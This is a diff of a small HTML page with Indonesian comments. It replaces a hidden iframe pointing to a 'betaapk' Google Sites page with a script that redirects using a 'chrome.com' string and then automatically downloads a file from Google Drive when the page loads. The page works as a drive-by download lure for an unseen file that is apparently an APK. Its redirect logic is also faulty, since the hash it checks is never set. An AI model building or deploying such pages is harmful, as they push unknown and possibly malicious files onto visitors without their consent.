@@ -1,29 +1,25 @@
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<style>
-    h1 {
-        margin: 1em;
-    }
-
-    iframe {
-        display: none;
-        width: 100%;
-        height: 600px;
-        border: 0;
-    }
-</style>
-
-
-<iframe id="frame" src="https://sites.google.com/view/betaapk"></iframe>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirect + Download</title>
+</head>
+<body>
 
 <script>
-    // Tampilkan iframe setelah 2 detik
-    setTimeout(() => {
-        document.getElementById("frame").style.display = "block";
-    }, 3500);
+// STEP 1: cek apakah sudah redirect
+if (!window.location.hash) {
+    // redirect ke halaman yang sama (simulasi "localhost redirect")
+    window.location.href = window.location.href + "https://chrome.com";
+} else {
 
-    // Redirect ke Google setelah 4 detik
-    setTimeout(() => {
-        window.location.href = "https://google.com";
-    }, 215);
+    // STEP 2: setelah redirect → download
+    window.onload = function() {
+        window.location.href =
+            "https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL&export=download&authuser=0";
+    };
+
+}
 </script>
+
+</body>
+</html>
